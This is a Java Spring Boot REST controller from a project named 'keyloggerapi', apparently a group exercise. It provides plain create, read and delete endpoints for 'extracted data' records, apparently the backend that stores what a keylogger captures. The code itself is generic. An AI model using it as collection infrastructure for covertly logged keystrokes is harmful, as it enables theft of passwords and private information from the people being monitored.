package com.grupo1.keyloggerapi.controllers;

import java.util.ArrayList;
import java.util.Optional;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import com.grupo1.keyloggerapi.models.ExtractedDataModel;
import com.grupo1.keyloggerapi.services.ExtractedDataService;

@RestController
@RequestMapping("/data")
public class ExtractedDataController {
    @Autowired
    ExtractedDataService extractedDataService;

    @GetMapping()
    public ArrayList<ExtractedDataModel> obtainAllData(){
        return extractedDataService.obtainData();
    }

    @PostMapping()
    public ExtractedDataModel saveData(@RequestBody ExtractedDataModel data){
        return this.extractedDataService.saveData(data);
    }

    @GetMapping( path = "/{id}")
    public Optional<ExtractedDataModel> obtainDataById(@PathVariable("id") Long id) {
        return this.extractedDataService.obtainDataById(id);
    }

    @DeleteMapping( path = "/{id}")
    public String deleteDataById(@PathVariable("id") Long id){

        if(this.extractedDataService.obtainDataById(id).isPresent()){
            this.extractedDataService.deleteDataById(id);
            return "Deleted data with id " + id;
        }else{
            return "Could not delete data with id " + id + " (probably id does not exist)";
        }
    }
}
